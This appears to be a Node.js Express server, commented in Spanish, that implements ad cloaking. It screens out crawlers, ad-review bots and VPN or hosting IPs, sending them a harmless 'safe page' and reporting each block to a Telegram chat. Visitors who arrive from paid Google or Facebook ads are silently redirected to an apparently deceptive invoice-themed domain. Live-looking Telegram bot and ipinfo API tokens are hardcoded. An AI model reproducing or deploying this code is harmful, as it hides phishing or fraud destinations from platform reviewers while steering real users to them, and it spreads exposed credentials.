const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

app.use(cors());

const CONFIG = {
    IPINFO_TOKEN: 'f14749fee64f8f', 
    TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY',
    TG_CHAT: '-1003321543933',
    DESTINO: 'https://airecaribeanfacture.onrender.com', 
    PORT: process.env.PORT || 3000
};

// --- LÓGICA DE FILTRADO ---
async function verificarVisitante(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = (req.headers['user-agent'] || '').toLowerCase();

    console.log(`\n🔎 IP: ${ip} | UA: ${ua.substring(0, 20)}...`);

    // --- BYPASS PARA LOCALHOST (Para que te funcione en tu PC) ---
    if (ip === '::1' || ip === '127.0.0.1' || ip.includes('192.168.') || ip.includes('::ffff:127.0.0.1')) {
        console.log("✅ LOCALHOST: Filtros desactivados.");
        return { ok: true };
    }

    // 1. Filtro de Bots
    const bots = ['googlebot', 'adsbot', 'lighthouse', 'bot', 'crawler', 'spider', 'headless', 'facebook'];
    if (bots.some(b => ua.includes(b))) return { ok: false, r: "Bot Detectado" };

    // 2. Filtro de IP (VPN/Proxy)
    try {
        const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${CONFIG.IPINFO_TOKEN}`);
        if (data.privacy && (data.privacy.vpn || data.privacy.proxy || data.privacy.hosting)) {
            return { ok: false, r: "VPN Detectada", d: data };
        }
        return { ok: true, d: data };
    } catch (e) {
        return { ok: true }; // Si falla API, dejar pasar
    }
}

// --- RUTA PRINCIPAL ---
app.get('/:slug', async (req, res) => {
    if (req.params.slug.length < 3) return res.status(404).end();

    const check = await verificarVisitante(req);

    // CASO A: BLOQUEADO (Bot/VPN) -> Solo Safe Page
    if (!check.ok) {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        axios.post(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TG_CHAT,
            text: `🚫 *BLOQUEO*\nIP: \`${ip}\`\nMotivo: ${check.r}`,
            parse_mode: 'Markdown'
        }).catch(()=>{});

        res.set('Content-Type', 'application/javascript');
        return res.send("console.log('⛔ BLOQUEADO'); window.__view = true;");
    }

    // CASO B: APROBADO -> Script de Análisis de URL
    console.log("🚀 Enviando lógica de redirección...");
    
    res.set('Content-Type', 'application/javascript');
    
    const payload = `
        (function(){
            // Leemos la URL completa como texto para evitar errores de parseo
            var url = window.location.href;
            console.log("Analizando URL:", url);

            // Palabras clave que activan la redirección
            var triggers = ["gclid", "gad_source", "gbraid", "fbclid"];
            
            // Verificamos si alguna palabra clave está en la URL
            var esTraficoPago = triggers.some(function(t) { return url.indexOf(t) !== -1; });

            if (esTraficoPago) {
                console.log("🚀 TRAFICO PAGO DETECTADO -> REDIRECCIONANDO"); // <--- CORREGIDO AQUÍ
                // Concatenamos los parámetros originales al destino
                var params = window.location.search || "";
                window.top.location.href = "${CONFIG.DESTINO}" + params;
            } else {
                console.log("👀 TRAFICO ORGANICO -> MOSTRANDO SAFE PAGE");
                // Activamos la vista segura y borramos el preloader
                window.__view = true;
                var l = document.getElementById('preloader');
                if(l) l.style.display = 'none';
            }
        })();
    `;
    res.send(payload);
});


app.listen(CONFIG.PORT, () => console.log(`🔥 SERVER EN PUERTO ${CONFIG.PORT}`));